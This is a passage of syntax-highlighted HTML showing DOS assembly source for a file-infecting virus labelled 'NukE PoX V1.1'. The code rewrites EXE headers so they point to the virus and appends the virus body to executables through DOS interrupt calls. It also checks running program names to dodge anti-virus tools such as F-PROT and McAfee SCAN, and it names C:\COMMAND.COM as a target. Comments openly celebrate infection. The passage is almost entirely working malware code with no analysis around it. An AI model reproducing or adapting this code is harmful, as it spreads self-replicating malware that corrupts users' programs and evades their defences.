                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                          </span><span class="sc1">;Fix for Header for  </span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                         </span><span class="sc1">;new file size in 512</span><span class="sc0">
                                                      </span><span class="sc1">;byte pages          </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                          </span><span class="sc1">;And the remainder   </span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                         </span><span class="sc1">;after dividing by   </span><span class="sc0">
                                                      </span><span class="sc1">;512...              </span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                              
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1FFh</span><span class="sc0">                                            
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">outta_here</span><span class="sc0">                                         
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                                                 
</span><span class="sc5">outta_here</span><span class="sc4">:</span><span class="sc0">                                                                
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                 
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Save Remainder      </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;Save Size in 512 pag</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_me</span><span class="sc0">                     </span><span class="sc1">;INFECT File! Yeah!  </span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_exe</span><span class="sc0">                                           
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write NEW EXE Header back </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;to EXE File! Points to    </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">;The Virus Now!!! ehhe     </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
</span><span class="sc5">exit_exe</span><span class="sc4">:</span><span class="sc0">                                                                  
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_now</span><span class="sc0">                                           
                                                                           
</span><span class="sc5">rocko</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">                                                       
                                                                           
</span><span class="sc5">exe_ip</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;Original IP,CS,SP,SS From EXE     </span><span class="sc0">
</span><span class="sc5">exe_cs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;Header!                           </span><span class="sc0">
</span><span class="sc5">exe_sp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                                                  
</span><span class="sc5">exe_ss</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                                                  
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;                   Infection Routine...                                   </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">infect_me</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                                               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;Write the New Encrypted   </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">init_virus</span><span class="sc0">    </span><span class="sc1">;Virus to File!            </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                                      
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_error</span><span class="sc0">              </span><span class="sc1">;Error Split               </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                                           
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Pointer back to beginning </span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;file!                     </span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                
                                                                           
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_error</span><span class="sc0">              </span><span class="sc1">;Split Dude...             </span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">;Clear carry flag          </span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                                       
</span><span class="sc5">exit_error</span><span class="sc4">:</span><span class="sc0">                                                                
                </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">;Set carry flag            </span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                                       
</span><span class="sc5">infect_me</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">                                                       
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;      Fix EXE Header...Gets new SS, CS Values for EXEs headers            </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">multiply</span><span class="sc0">                </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                                       
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                                             
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                              
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                               
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                                              
                                                                           
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                              
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                                             
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                 
                </span><span class="sc6">retn</span><span class="sc0">                                                       
</span><span class="sc5">multiply</span><span class="sc0">                </span><span class="sc9">endp</span><span class="sc0">                                               
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc1">;       Check to see if an `Anti-Viral' Product is being executed.         </span><span class="sc0">
</span><span class="sc1">;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- </span><span class="sc0">
</span><span class="sc5">check_name</span><span class="sc0">              </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                                       
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                                                 
                                                                           
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                              
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">128h</span><span class="sc0">                                            
</span><span class="sc5">loop_me</span><span class="sc4">:</span><span class="sc0">                                                                   
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">2Eh</span><span class="sc0">    </span><span class="sc1">;Find ASCIIZ String        </span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">next_ok</span><span class="sc0">                                            
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                                                 
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop_me</span><span class="sc0">                                            
</span><span class="sc5">next_ok</span><span class="sc4">:</span><span class="sc0">                                                                   
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'TO'</span><span class="sc0">          </span><span class="sc1">;Is it ??PROT.EXE (F-PROT) </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_1</span><span class="sc0">                  </span><span class="sc1">;Naaa                      </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'RP'</span><span class="sc0">                                     
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_file</span><span class="sc0">                </span><span class="sc1">;Yupe...                   </span><span class="sc0">
</span><span class="sc5">next_1</span><span class="sc4">:</span><span class="sc0">                                                                    
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">          </span><span class="sc1">;Is it SCAN.EXE (McAffee)  </span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_2</span><span class="sc0">                  </span><span class="sc1">;Naaa                      </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">                                     
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_file</span><span class="sc0">                </span><span class="sc1">;Yupe...                   </span><span class="sc0">
</span><span class="sc5">next_2</span><span class="sc4">:</span><span class="sc0">                                                                    
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">          </span><span class="sc1">;is it ?LEAN.EXE (Clean.EXE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next_3</span><span class="sc0">                  </span><span class="sc1">;Naaa                      </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'EL'</span><span class="sc0">                                     
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_file</span><span class="sc0">                </span><span class="sc1">;Yupe...                   </span><span class="sc0">
</span><span class="sc5">next_3</span><span class="sc4">:</span><span class="sc0">                                                                    
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                                                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;good file Set CARRY FLAG  </span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">;to normal                 </span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                                       
</span><span class="sc5">bad_file</span><span class="sc4">:</span><span class="sc0">                                                                  
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;Bad file, Set CARRY FLAG  </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;ON!!!                     </span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">                                                        
                </span><span class="sc6">retn</span><span class="sc0">                                                       
</span><span class="sc5">check_name</span><span class="sc0">              </span><span class="sc9">endp</span><span class="sc0">                                               
                                                                           
</span><span class="sc5">command</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\COMMAND.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;What to infect!           </span><span class="sc0">
</span><span class="sc5">old_time</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                                                  
</span><span class="sc5">old_date</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">                                                  
</span><span class="sc5">jump_address</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">                                       
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">                                      
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                                        
</span><span class="sc5">msg</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NukE PoX V1.1 - R.S"</span><span class="sc0">                              
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">                                                                      
</span><span class="sc5">seg_a</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">                                                       
                                                                           
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">                                              
</span></div></body>
</html>
